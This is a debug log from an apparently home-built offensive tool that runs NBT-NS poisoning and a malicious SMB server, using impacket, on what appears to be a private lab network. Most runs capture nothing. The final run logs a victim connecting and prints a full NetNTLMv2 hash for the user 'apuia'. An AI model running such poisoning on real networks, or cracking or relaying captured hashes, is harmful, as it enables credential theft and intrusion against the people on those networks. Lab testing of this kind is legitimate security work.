2021-11-30 17:39:52.330 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:228 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
2021-12-04 17:45:13.020 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.022 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.023 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.026 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.026 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.097 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.098 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.101 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.101 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.113 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.113 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.333 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.333 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.336 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.337 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.635 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.636 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.770 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.771 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.773 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.773 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.775 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.775 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.788 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.788 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.790 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.790 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.792 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.793 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.847 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.847 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:13.849 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:13.850 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:14.537 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:14.538 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:14.542 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:14.544 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:14.546 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:14.546 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:15.303 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:15.304 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:15.307 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:15.308 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:15.312 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:45:15.313 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:45:16.744 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:46:57.656 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:46:57.657 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:46:57.662 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:46:57.672 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:46:57.673 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:46:57.681 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:46:57.690 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:46:57.692 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:47:08.591 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:47:08.592 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:47:08.593 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:47:08.629 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:47:08.629 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:47:08.630 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:47:24.908 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:47:34.395 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:47:34.397 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:47:34.403 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:47:34.417 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:47:34.419 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:47:34.437 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:47:34.439 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:47:34.442 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:47:43.929 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 17:47:57.161 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 17:47:57.163 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 17:47:57.169 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 17:47:57.182 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 17:47:57.183 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 17:47:57.195 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 17:47:57.208 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 17:47:57.210 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 17:48:05.806 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:48:05.808 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:48:05.809 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:48:05.853 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:48:05.854 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:48:05.855 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:48:06.849 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:48:06.849 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:48:07.591 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:48:07.592 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:48:07.592 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 17:48:07.637 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 17:48:07.638 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 17:48:07.638 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 17:48:18.848 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:02:38.978 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 18:02:38.980 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 18:02:38.988 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:02:39.000 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:552 - Starting nbt-ns poisoning...
2021-12-04 18:02:39.001 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:02:39.008 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:02:39.015 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:02:39.017 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:03:02.551 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:03:38.839 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 18:03:38.840 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 18:03:38.843 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:03:38.851 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:552 - Starting nbt-ns poisoning...
2021-12-04 18:03:38.852 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:03:38.856 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:03:38.857 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:03:38.860 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:03:56.901 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:04:48.419 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 18:04:48.421 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 18:04:48.424 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:04:48.430 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:552 - Starting nbt-ns poisoning...
2021-12-04 18:04:48.430 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:04:48.436 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:04:48.441 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:04:48.442 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:05:07.736 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:06:24.947 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 18:06:24.948 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 18:06:24.953 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:06:24.959 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 18:06:24.959 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:06:24.964 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:06:24.967 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:06:24.971 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:06:44.480 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:07:28.775 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 18:07:28.776 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 18:07:28.778 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:07:28.785 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:552 - Starting nbt-ns poisoning...
2021-12-04 18:07:28.785 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:07:28.789 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:07:28.790 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:07:28.794 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:09:00.774 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:09:05.704 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 18:09:05.705 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 18:09:05.708 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:09:05.714 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 18:09:05.715 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:09:05.718 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:09:05.718 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:09:05.719 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:09:21.265 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
2021-12-04 18:09:42.182 | DEBUG    | project.ManInTheMiddle.maninthemiddle:do_mss:237 - Starting malicious smb server attack using ip: 192.168.253.135 ipv6:fe80::20c:29ff:fe89:df69
            interface: ens33 mac_address:00:0c:29:89:df:69 lport:445
2021-12-04 18:09:42.182 | DEBUG    | project.igris:check_settable_variables_value:205 - Checking the correct value of the necessary settable variables 
2021-12-04 18:09:42.185 | INFO     | project.ManInTheMiddle.maninthemiddle:__launching_attack:130 - Running mss the results will be saved in : /home/rsgbengi/Igris
2021-12-04 18:09:42.189 | INFO     | project.ManInTheMiddle.Poison.poisoners:start_nbt_ns_poisoning:551 - Starting nbt-ns poisoning...
2021-12-04 18:09:42.189 | INFO     | project.ManInTheMiddle.servers.smbserver:start_malicious_smbserver:65 - Starting Malicious SMB Server ...
2021-12-04 18:09:42.193 | INFO     | impacket.smbserver:processConfigFile:4491 - Config file parsed
2021-12-04 18:09:42.199 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
2021-12-04 18:09:42.200 | INFO     | impacket.dcerpc.v5.rpcrt:addCallbacks:1515 - Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
2021-12-04 18:09:52.501 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 18:09:52.502 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / IP / UDP 192.168.253.135:netbios_ns > 192.168.253.129:netbios_ns / NBNSQueryRequest / Raw
2021-12-04 18:09:52.502 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to 192.168.253.129[0m
2021-12-04 18:09:52.529 | INFO     | impacket.smbserver:handle:3756 - Incoming connection (192.168.253.129,49829)
2021-12-04 18:09:52.539 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:522 - Packet crafted: 
2021-12-04 18:09:52.540 | DEBUG    | project.ManInTheMiddle.Poison.poisoners:__send_packet:523 - Ether / UDP netbios_ns > netbios_ns / NBNSQueryRequest / Raw
2021-12-04 18:09:52.540 | INFO     | project.ManInTheMiddle.Poison.poisoners:__send_packet:526 - [36m(NBT_NS) Sending packet to None[0m
2021-12-04 18:09:52.555 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2461 - AUTHENTICATE_MESSAGE (RSGBENGICORP\apuia,PC-ALEX)
2021-12-04 18:09:52.556 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2494 - User PC-ALEX\apuia authenticated successfully
2021-12-04 18:09:52.559 | INFO     | impacket.smbserver:smbComSessionSetupAndX:2506 - apuia::RSGBENGICORP:aaaaaaaaaaaaaaaa:d0daaa421f8d0ad37e8917ce525b5340:0101000000000000009816223ae9d701c185f9318f04a5d400000000010010006400670068006c004100620064007700030010006400670068006c004100620064007700020010004100760050006e006a00510075005100040010004100760050006e006a0051007500510007000800009816223ae9d70106000400020000000800300030000000000000000100000000200000af44d7f9c3ab608386743dc72c616af977f08d4be4b3d674f7e715ca02e8be830a0010000000000000000000000000000000000009001a0063006900660073002f0061006e007300690065006400610064000000000000000000
2021-12-04 18:09:52.586 | INFO     | impacket.smbserver:NetrWkstaGetInfo:4534 - NetrWkstaGetInfo Level: 100
2021-12-04 18:09:52.603 | INFO     | impacket.smbserver:NetrServerGetInfo:4624 - NetrServerGetInfo Level: 101
2021-12-04 18:09:53.015 | INFO     | impacket.smbserver:NetrShareEnum:4641 - NetrShareEnum Level: 1
2021-12-04 18:09:57.636 | WARNING  | project.ManInTheMiddle.maninthemiddle:__synchronous_attack:121 - Exiting smb relay attack ...
